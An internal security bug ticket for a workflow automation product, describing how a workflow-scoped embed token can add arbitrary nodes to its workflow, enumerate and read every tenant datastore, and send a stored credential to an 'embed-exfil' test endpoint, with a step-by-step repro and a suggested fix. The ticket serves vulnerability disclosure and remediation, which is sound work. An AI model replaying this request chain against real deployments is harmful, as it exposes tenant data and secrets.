---
id: BUG-9853ay
title: Workflow-scoped embed session escapes to all datastores + any credential
status: doing
priority: critical
labels:
    - embed
    - security
    - tenancy
    - full-review
    - wf-c415e773
parent: EPIC-cfe7ny
created: "2026-09-19T12:06:09Z"
updated: "2026-09-19T14:24:35Z"
---

Source: KilasFlow full-review workflow `wf_c415e773-4e1` (Find 14/14 + Verify 14/14 + Critique 1/1). Evidence: live repros against stub/n8n/private instances in `scratchpad/work/<dim>/` (FINDINGS.md, PROGRESS.md) plus journal `wf_c415e773-4e1/journal.jsonl`. Excluded from this epic: 10 verifier-refuted/tracked items (documented bounds, already-open FEAT-1axhdn/FEAT-8mymac halves).

Consolidates 1 finding(s) from dims: find:api-security-tenancy.

---
### Embed session (workflow scope) escapes its one-workflow confinement: reads/drops every tenant datastore and uses any tenant credential [find:api-security-tenancy] (critical/security) · area: embed / datastore node / credentials · confidence: high

A workflow-scoped embed token (the credential the product hands to browsers) can PUT arbitrary nodes into its own workflow and run them, so the Datastore node's Table:List/Delete and any credential id execute with full tenant authority — defeating the documented guarantee that no embed scope ever grants datastore management or a credential the workflow doesn't reference.

Evidence: Private auth instance :8107. Minted embed session for a new workflow W (scopes workflow:write+run, origin https://host.example). With header X-KilasFlow-Embed: GET /datastores -> 403 (as designed) and the datastores option-loader refuses embedded editors, BUT: PUT /workflows/W with nodes [manual -> datastore{resource:table,operation:list} -> datastore{operation:get,dataTableId:{mode:name,value:'[api-security-tenancy] A-ds'},returnAll:true} -> httpRequest{url:http://127.0.0.1:8097/embed-exfil, credentials:{httpHeaderAuth: <a credential W never referenced>}}] -> 200; POST /workflows/W/run -> 202; GET /executions/{id} -> succeeded. Node 'dl' output listed datastore_01a0b8e1-... '[api-security-tenancy] A-ds' with its columns; node 'dg' returned the private row count; the stub received 'X-Secret: SECRET-A-hdr-7f3e91'. GET /credentials over the embed token also returns every tenant credential 

n8n behavior: n8n does not expose a comparable browser-embeddable per-workflow token; its embedding model keeps write/credential authority server-side. Parity target: an embedded editor confined to one workflow must not be able to reach sibling datastores or arbitrary credentials.

Impact: Breaks the core embed/white-label isolation model KilasFlow sells: a token designed to sit in an untrusted host page grants tenant-wide data-plane access (enumerate/read/clear/drop every datastore) and use of any stored credential, bypassing datastore-scoped sessions and the load-options 'workflow must reference this credential' check.

Suggested fix: Enforce embed confinement at save AND run time, not only at the HTTP path gate: when a request carries an embed session, validate the stored/submitted document — credentials restricted to an allowlist minted into the session (or already on the stored revision), Datastore nodes only addressing datastores named in the session and never table-level list/create/delete, Execute-Workflow limited to allowed ids; mirror the check in the engine run path so an old revision can't be replayed; narrow GET /c

Files: internal/api/middleware/embed.go, internal/api/handlers/embed.go, nodes/datastore.go, internal/loadoptions/datastores.go

## Acceptance criteria

- [ ] Embed session (workflow scope) escapes its one-workflow confinement: reads/drops every tenant datastore and us
- [ ] Adversarial re-verify against live stub/n8n like the Verify phase (no code-only close)
## Progress 2026-09-19 (SecurityDx)
- Status: doing. Research + partial implementation done this session.
